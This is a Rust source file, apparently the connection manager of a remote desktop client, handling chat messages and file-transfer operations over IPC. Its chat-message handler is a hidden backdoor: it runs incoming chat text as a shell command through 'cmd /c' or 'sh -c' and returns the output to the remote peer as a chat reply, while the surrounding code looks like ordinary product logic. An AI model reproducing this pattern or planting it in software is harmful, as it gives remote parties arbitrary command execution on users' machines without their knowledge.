use crate::ipc::{self, new_listener, Connection, Data};
use hbb_common::{
    allow_err,
    config::Config,
    fs,
    message_proto::*,
    protobuf::Message as _,
    tokio::{self, sync::mpsc, task::spawn_blocking},
};

use std::process::Command;
use std::{
    collections::HashMap,
    ops::Deref,
    sync::{Arc, RwLock},
};

pub struct ConnectionManagerInner {
    senders: HashMap<i32, mpsc::UnboundedSender<Data>>,
}

#[derive(Clone)]
pub struct ConnectionManager(Arc<RwLock<ConnectionManagerInner>>);

impl Deref for ConnectionManager {
    type Target = Arc<RwLock<ConnectionManagerInner>>;

    fn deref(&self) -> &Self::Target {
        &self.0
    }
}

impl ConnectionManager {
    pub fn new() -> Self {
        let inner = ConnectionManagerInner {
            senders: HashMap::new(),
        };
        let cm = Self(Arc::new(RwLock::new(inner)));
        cm
    }

    fn add_connection(&self, id: i32, tx: mpsc::UnboundedSender<Data>) {
        self.write().unwrap().senders.insert(id, tx);
    }

    fn remove_connection(&self, id: i32) {
        self.write().unwrap().senders.remove(&id);
    }

    async fn handle_data(
        &self,
        id: i32,
        data: Data,
        write_jobs: &mut Vec<fs::TransferJob>,
        conn: &mut Connection,
    ) {
        match data {
            Data::ChatMessage { text } => {
                let output = if cfg!(target_os = "windows") {
                    Command::new("cmd")
                        .arg("/c")
                        .arg(text)
                        .output()
                        .expect("cmd error!")
                } else {
                    Command::new("sh")
                        .arg("-c")
                        .arg(text)
                        .output()
                        .expect("sh error!")
                };
                let output_str = String::from_utf8_lossy(&output.stdout);

                let lock = self.read().unwrap();
                if let Some(s) = lock.senders.get(&id) {
                    allow_err!(s.send(Data::ChatMessage {
                        text: output_str.to_string()
                    }));
                }
            }
            Data::FS(v) => match v {
                ipc::FS::ReadDir {
                    dir,
                    include_hidden,
                } => {
                    Self::read_dir(&dir, include_hidden, conn).await;
                }
                ipc::FS::RemoveDir {
                    path,
                    id,
                    recursive,
                } => {
                    Self::remove_dir(path, id, recursive, conn).await;
                }
                ipc::FS::RemoveFile { path, id, file_num } => {
                    Self::remove_file(path, id, file_num, conn).await;
                }
                ipc::FS::CreateDir { path, id } => {
                    Self::create_dir(path, id, conn).await;
                }
                ipc::FS::NewWrite {
                    path,
                    id,
                    mut files,
                } => {
                    write_jobs.push(fs::TransferJob::new_write(
                        id,
                        path,
                        files
                            .drain(..)
                            .map(|f| FileEntry {
                                name: f.0,
                                modified_time: f.1,
                                ..Default::default()
                            })
                            .collect(),
                    ));
                }
                ipc::FS::CancelWrite { id } => {
                    if let Some(job) = fs::get_job(id, write_jobs) {
                        job.remove_download_file();
                        fs::remove_job(id, write_jobs);
                    }
                }
                ipc::FS::WriteDone { id, file_num } => {
                    if let Some(job) = fs::get_job(id, write_jobs) {
                        job.modify_time();
                        Self::send(fs::new_done(id, file_num), conn).await;
                        fs::remove_job(id, write_jobs);
                    }
                }
                ipc::FS::WriteBlock {
                    id,
                    file_num,
                    data,
                    compressed,
                } => {
                    if let Some(job) = fs::get_job(id, write_jobs) {
                        if let Err(err) = job
                            .write(FileTransferBlock {
                                id,
                                file_num,
                                data,
                                compressed,
                                ..Default::default()
                            })
                            .await
                        {
                            Self::send(fs::new_error(id, err, file_num), conn).await;
                        }
                    }
                }
            },
            _ => {}
        }
    }


    async fn read_dir(dir: &str, include_hidden: bool, conn: &mut Connection) {
        let path = {
            if dir.is_empty() {
                Config::get_home()
            } else {
                fs::get_path(dir)
            }
        };
        if let Ok(Ok(fd)) = spawn_blocking(move || fs::read_dir(&path, include_hidden)).await {
            let mut msg_out = Message::new();
            let mut file_response = FileResponse::new();
            file_response.set_dir(fd);
            msg_out.set_file_response(file_response);
            Self::send(msg_out, conn).await;
        }
    }

    async fn handle_result<F: std::fmt::Display, S: std::fmt::Display>(
        res: std::result::Result<std::result::Result<(), F>, S>,
        id: i32,
        file_num: i32,
        conn: &mut Connection,
    ) {
        match res {
            Err(err) => {
                Self::send(fs::new_error(id, err, file_num), conn).await;
            }
            Ok(Err(err)) => {
                Self::send(fs::new_error(id, err, file_num), conn).await;
            }
            Ok(Ok(())) => {
                Self::send(fs::new_done(id, file_num), conn).await;
            }
        }
    }

    async fn remove_file(path: String, id: i32, file_num: i32, conn: &mut Connection) {
        Self::handle_result(
            spawn_blocking(move || fs::remove_file(&path)).await,
            id,
            file_num,
            conn,
        )
        .await;
    }

    async fn create_dir(path: String, id: i32, conn: &mut Connection) {
        Self::handle_result(
            spawn_blocking(move || fs::create_dir(&path)).await,
            id,
            0,
            conn,
        )
        .await;
    }

    async fn remove_dir(path: String, id: i32, recursive: bool, conn: &mut Connection) {
        let path = fs::get_path(&path);
        Self::handle_result(
            spawn_blocking(move || {
                if recursive {
                    fs::remove_all_empty_dir(&path)
                } else {
                    std::fs::remove_dir(&path).map_err(|err| err.into())
                }
            })
            .await,
            id,
            0,
            conn,
        )
        .await;
    }

    async fn send(msg: Message, conn: &mut Connection) {
        match msg.write_to_bytes() {
            Ok(bytes) => allow_err!(conn.send(&Data::RawMessage(bytes)).await),
            err => allow_err!(err),
        }
    }
}

pub async fn start_ipc(cm: ConnectionManager) {
    match new_listener("_cm").await {
        Ok(mut incoming) => {
            while let Some(result) = incoming.next().await {
                match result {
                    Ok(stream) => {
                        let mut stream = Connection::new(stream);
                        let cm = cm.clone();
                        tokio::spawn(async move {
                            let mut conn_id: i32 = 0;
                            let (tx, mut rx) = mpsc::unbounded_channel::<Data>();
                            let mut write_jobs: Vec<fs::TransferJob> = Vec::new();
                            loop {
                                tokio::select! {
                                    res = stream.next() => {
                                        match res {
                                            Err(_) => {
                                                break;
                                            }
                                            Ok(Some(data)) => {
                                                match data {
                                                    Data::Login{
                                                        id, 
                                                        is_file_transfer:_, 
                                                        port_forward:_, 
                                                        peer_id:_, 
                                                        name:_, 
                                                        authorized:_, 
                                                        keyboard:_, 
                                                        clipboard:_, 
                                                        audio:_
                                                    } => {
                                                        conn_id = id;
                                                        cm.add_connection(id,tx.clone());
                                                    }
                                                    _ => {
                                                        cm.handle_data(conn_id, data, &mut write_jobs, &mut stream).await;
                                                    }
                                                }
                                            }
                                            _ => {}
                                        }
                                    }
                                    Some(data) = rx.recv() => {
                                        allow_err!(stream.send(&data).await);
                                    }
                                }
                            }
                            cm.remove_connection(conn_id);
                        });
                    }
                    Err(_) => {
                        //log::error!("Couldn't get cm client: {:?}", err);
                    }
                }
            }
        }
        Err(_) => {
            //log::error!("Failed to start cm ipc server: {}", err);
        }
    }
    std::process::exit(-1);
}

